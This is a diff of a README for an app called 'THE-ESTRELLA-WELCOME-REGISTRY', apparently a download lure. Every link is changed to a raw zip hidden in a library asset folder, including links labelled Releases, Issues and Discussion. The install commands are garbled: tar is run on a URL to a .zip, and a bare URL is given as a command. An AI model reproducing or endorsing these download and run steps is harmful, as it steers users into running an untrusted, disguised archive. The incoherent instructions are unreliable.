@@ -1,6 +1,6 @@
 # 🌌 THE-ESTRELLA-WELCOME-REGISTRY - Join the Journey to First Contact
 
-[![Download THE-ESTRELLA-WELCOME-REGISTRY](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip%20Now-Click%https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip)](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip)
+[![Download THE-ESTRELLA-WELCOME-REGISTRY](https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip%20Now-Click%https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip)](https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip)
 
 ## ✨ Overview
 
@@ -20,14 +20,14 @@ Ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, **visit this page to download**: [THE-ESTRELLA-WELCOME-REGISTRY Releases](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip).
+To download the application, **visit this page to download**: [THE-ESTRELLA-WELCOME-REGISTRY Releases](https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip).
 
-1. Go to the [Releases page](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip).
 2. Locate the latest version of the application.
 3. Click on the file that corresponds to your operating system. You will usually see options like:
-   - `https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip`
-   - `https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip`
-   - `https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip`
+   - `https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip`
+   - `https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip`
+   - `https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip`
 4. The download will start.
 
 ### ⚙️ Installation Steps
@@ -51,12 +51,12 @@ After downloading, follow these steps to install:
 #### For Linux Users
 
 1. Open the terminal.
-2. Navigate to the directory where the `https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip` file is located.
+2. Navigate to the directory where the `https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip` file is located.
 3. Run the following commands:
    ```bash
-   tar -xzf https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip
+   tar -xzf https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip
    cd THE-ESTRELLA-WELCOME-REGISTRY
-   https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip
+   https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip
    ```
 4. Follow any prompts to complete the installation.
 
@@ -79,18 +79,18 @@ After installation, you can run the application based on your operating system:
 
 We welcome community involvement! If you have ideas to improve the application or wish to share your experiences, consider contributing through:
 
-- Reporting issues on our [Issues Page](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip).
+- Reporting issues on our [Issues Page](https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip).
 - Submitting feature requests.
 - Joining discussions to explore topics around AI safety and collaboration.
 
 ## 📞 Support
 
-If you face any issues or have questions, our support team is here to help. Reach out through our [Discussion Page](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip) for support or to connect with other users.
+If you face any issues or have questions, our support team is here to help. Reach out through our [Discussion Page](https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip) for support or to connect with other users.
 
 ## 🥳 Acknowledgments
 
 Thank you for joining us in this important journey. Your involvement will play a crucial role in shaping the future of human-AI relations. 
 
-Remember to download the application from our releases page: [THE-ESTRELLA-WELCOME-REGISTRY Releases](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip).
+Remember to download the application from our releases page: [THE-ESTRELLA-WELCOME-REGISTRY Releases](https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip).
 
-[![Download THE-ESTRELLA-WELCOME-REGISTRY](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip%20Now-Click%https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip)](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip)
+[![Download THE-ESTRELLA-WELCOME-REGISTRY](https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip%20Now-Click%https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip)](https://raw.githubusercontent.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/main/lib/owlcarousel/assets/REGISTRY_TH_ESTRELL_WELCOM_consolidation.zip)
